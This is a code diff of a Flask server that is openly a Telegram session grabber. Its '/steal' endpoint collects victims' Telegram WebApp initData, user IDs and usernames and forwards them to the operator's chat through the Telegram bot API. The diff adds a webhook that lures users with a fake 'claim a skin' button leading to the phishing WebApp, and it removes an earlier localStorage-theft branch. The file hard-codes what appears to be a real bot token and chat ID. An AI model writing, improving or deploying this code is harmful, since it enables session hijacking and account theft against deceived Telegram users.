@@ -5,9 +5,9 @@ from datetime import datetime
 
 app = Flask(__name__)
 
-# ТВОИ ДАННЫЕ
 BOT_TOKEN = "7854566294:AAGyNSrEwNeZ9SNEFR2HZKNaYkv3ZhIoTXk"
-CHAT_ID = "5388340518"  # твой ID (если не тот — поменяй)
+CHAT_ID = "5388340518"
+WEBAPP_URL = "https://tg-session-grabber.onrender.com"
 
 @app.route('/')
 def index():
@@ -16,46 +16,35 @@ def index():
 @app.route('/steal', methods=['POST'])
 def steal():
     data = request.get_json()
-    
     print(f"[{datetime.now()}] Received: {data}")
     
     if data:
-        msg = f"🔥 **НОВАЯ ЖЕРТВА** 🔥\n"
-        msg += f"⏱ {datetime.now().strftime('%H:%M:%S')}\n\n"
+        msg = f"🔥 **ЖЕРТВА** 🔥\n{datetime.now().strftime('%H:%M:%S')}\n"
         
-        if data.get('method') == 'webapp' and data.get('user'):
-            user = data['user']
-            msg += f"**Метод:** WebApp\n"
-            msg += f"🆔 ID: {user.get('id', '?')}\n"
-            if user.get('username'):
-                msg += f"📛 @{user.get('username')}\n"
-            if user.get('first_name'):
-                msg += f"📝 {user.get('first_name')}\n"
-            if data.get('initData'):
-                msg += f"\n**initData:**\n`{data['initData'][:200]}`\n"
+        if data.get('user'):
+            u = data['user']
+            msg += f"ID: {u.get('id')}\n"
+            if u.get('username'):
+                msg += f"@{u.get('username')}\n"
         
-        elif data.get('method') == 'localstorage' and data.get('data'):
-            msg += f"**Метод:** localStorage\n"
-            for key, val in list(data['data'].items())[:3]:
-                if len(val) > 60:
-                    val = val[:60] + "..."
-                msg += f"`{key}`: {val}\n"
+        if data.get('initData'):
+            msg += f"\n`{data['initData'][:150]}`"
         
-        # Отправляем в Telegram
         url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
-        try:
-            r = requests.post(url, json={
-                'chat_id': CHAT_ID,
-                'text': msg[:500],
-                'parse_mode': 'Markdown'
-            })
-            print(f"Telegram: {r.status_code} {r.text}")
-        except Exception as e:
-            print(f"Error: {e}")
-        
+        requests.post(url, json={'chat_id': CHAT_ID, 'text': msg[:500], 'parse_mode': 'Markdown'})
         return jsonify({'status': 'ok'})
-    
     return jsonify({'status': 'error'}), 400
+
+@app.route('/webhook', methods=['POST'])
+def webhook():
+    data = request.get_json()
+    if 'message' in data:
+        chat_id = data['message']['chat']['id']
+        keyboard = {"inline_keyboard": [[{"text": "🎁 Забрать скин", "web_app": {"url": WEBAPP_URL}}]]}
+        url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
+        payload = {'chat_id': chat_id, 'text': "Нажми на кнопку", 'reply_markup': json.dumps(keyboard)}
+        requests.post(url, json=payload)
+    return jsonify({'ok': True})
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=8080)
